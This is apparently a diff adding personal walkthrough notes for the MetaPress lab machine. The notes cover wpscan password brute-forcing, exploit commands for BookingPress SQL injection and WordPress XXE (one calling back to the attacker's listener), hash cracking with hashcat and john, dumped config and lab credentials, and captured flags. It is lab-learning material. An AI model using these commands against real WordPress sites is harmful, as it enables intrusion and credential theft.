@@ -1,0 +1,160 @@
+# 10.10.11.186
+
+## NMAP scan
+
+### TCP Scan
+```
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-12 10:56 EDT
+Nmap scan report for 10.10.11.186
+Host is up (0.033s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+```
+### UDP Scan
+```
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+```
+
+## FootHold
+### Port 80
+- metapress website powered by `Wordpress 5.6.2`
+- Searching for `wp-content`
+    - Plugins:
+        - `/wp-content/plugins/bookingpress-appointment-booking/`
+    - Themes:
+        - `/wp-content/themes/twentytwentyone/assets/js/primary-navigation.js?ver=1.1`
+
+- Running wpscan
+    - `wpscan --password-attack xmlrpc -t 20 -U admin -P /opt/SecLists/mine/rockyou.txt --url http://metapress.htb`
+    - this confirmed the details above but did not find the plugin
+
+- Searching for bookingpress exploits
+    - found https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/
+
+- exploit from github - https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py
+    ```
+    python3 booking-press-expl.py -u http://metapress.htb -n 7fcbd643af
+    - BookingPress PoC
+    -- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
+    -- Count of users:  2
+    |admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
+    |manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
+    ```
+- cracking the hashes: `hashcat -m 400 '$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70' /opt/SecLists/mine/rockyou.txt`
+    - admin hash was not cracked
+    - manager@metapress.htb : `partylikearockstar`
+
+### Logged in as manager
+- We can see that there is a media upload functionality
+- Searching for wordpress 5.6.2 exploits - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5/
+    - this allows us `Authenticated XXE for php 8`
+- using this exploit - https://github.com/M3l0nPan/wordpress-cve-2021-29447
+- `python3 wordpress-cve-2021-29447.py -l http://10.10.14.67:8090 -r http://metapress.htb -u manager -p partylikearockstar`
+    - `/etc/passwd` shows there is a user `jnelson`
+    - `../wp-config.php` query result below:
+```
+<?php 
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
+define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
+define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
+define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
+define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
+define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
+define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
+define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );
+
+/**
+ * WordPress Database Table prefix.
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+```
+- `metapress.htb`:`9NYS_ii@FyL_p5M2NvJ`
+- `blog`:`635Aq@TdqrCwXFUZ`
+
+- FTP into the server using above creds
+    - nothing in the `blog` directory
+    - checking the `Mailer` directory we find creds for `jnelson`
+        - `jnelson`:`Cb4_JmWM8zUZWMu@Ys`
+
+## USER.TXT
+- ssh using jnelson, we get the user.txt - d5cdc9d454a8692747e5e8713eb86372
+
+## PrivEsc
+- in `jnelson` home directory, we find `.passpie`
+- this `.passpie` contains `.keys and .config`
+- According to Claude, we can using john to crack this
+- `gpg2john key-priv > metapress.hash`
+- `cat metapress.hash`
+``` 
+Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::key-priv
+```
+- `john --wordlist=/opt/SecLists/mine/rockyou.txt metapress.hash`
+    - `blink182`
+- `passpie export passwords.txt` - run in `/tmp`
+```
+cat passwords.txt 
+credentials:
+- comment: ''
+  fullname: root@ssh
+  login: root
+  modified: 2022-06-26 08:58:15.621572
+  name: ssh
+  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
+- comment: ''
+  fullname: jnelson@ssh
+  login: jnelson
+  modified: 2022-06-26 08:58:15.514422
+  name: ssh
+  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
+handler: passpie
+version: 1.0
+```
+- `su root` - bbcc9a93467d2e012a2618852428639b
